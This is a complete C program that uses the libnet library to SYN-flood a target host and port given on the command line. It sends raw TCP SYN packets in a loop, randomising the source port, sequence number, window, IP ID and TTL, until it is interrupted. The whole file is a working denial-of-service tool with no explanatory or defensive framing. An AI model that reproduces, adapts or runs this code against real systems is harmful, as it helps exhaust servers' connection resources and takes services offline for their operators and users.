#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // usleep()
#include <signal.h>
#include <libnet.h>

#define FLOOD_DELAY 5000  /* microseconds */

volatile sig_atomic_t running = 1;

void sig_handler(int sig) {
    running = 0;
}

int main(int argc, char *argv[]) {
    libnet_t *l;
    char errbuf[LIBNET_ERRBUF_SIZE];
    char *target;
    u_int16_t target_port;
    u_int32_t dest_ip;
    libnet_ptag_t t;

    if (argc != 3) {
        printf("Usage: %s <target host> <target port>\n", argv[0]);
        exit(1);
    }

    target = argv[1];
    target_port = (u_int16_t)atoi(argv[2]);

    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init: %s -- must run as root.\n", errbuf);
        exit(1);
    }

    dest_ip = libnet_name2addr4(l, target, LIBNET_DONT_RESOLVE);
    if (dest_ip == (u_int32_t)-1) {
        fprintf(stderr, "Bad IP: %s\n", target);
        libnet_destroy(l);
        exit(1);
    }

    libnet_seed_prand(l);
    signal(SIGINT, sig_handler);

    printf("SYN Flooding port %d of %s...\n", target_port, libnet_addr2name4(dest_ip, LIBNET_DONT_RESOLVE));

    while (running) {
        
        libnet_clear_packet(l);

        /* Build TCP header (no payload) */
        t = libnet_build_tcp(
            libnet_get_prand(LIBNET_PRu16),     // random src port
            target_port,
            libnet_get_prand(LIBNET_PRu32),     // random seq
            libnet_get_prand(LIBNET_PRu32),     // random ack (ignored for SYN)
            TH_SYN,
            libnet_get_prand(LIBNET_PRu16),     // random window
            0,                                  // checksum: 0 = autofill
            0,                                  // urg
            LIBNET_TCP_H,
            NULL, 0,                            // no payload
            l, 0
        );
        if (t == -1) {
            fprintf(stderr, "TCP build fail: %s\n", libnet_geterror(l));
            goto cleanup;
        }

        /* Build IP header */
           t = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_TCP_H,       // total len
            IPTOS_LOWDELAY,
            libnet_get_prand(LIBNET_PRu16),     // random IP ID
            0,                                  // no frag
            libnet_get_prand(LIBNET_PR8),       // random TTL
            IPPROTO_TCP,
            0,                                  // checksum autofill
            0,                                  // src IP: 
            dest_ip,
            NULL, 0,
            l, 0
        );
        if (t == -1) {
            fprintf(stderr, "IP build fail: %s\n", libnet_geterror(l));
            goto cleanup;
        }

        if (libnet_write(l) == -1) {
            fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
        }

        usleep(FLOOD_DELAY);
    }

    printf("\nStopped.\n");

cleanup:
    libnet_destroy(l);
    return 0;
}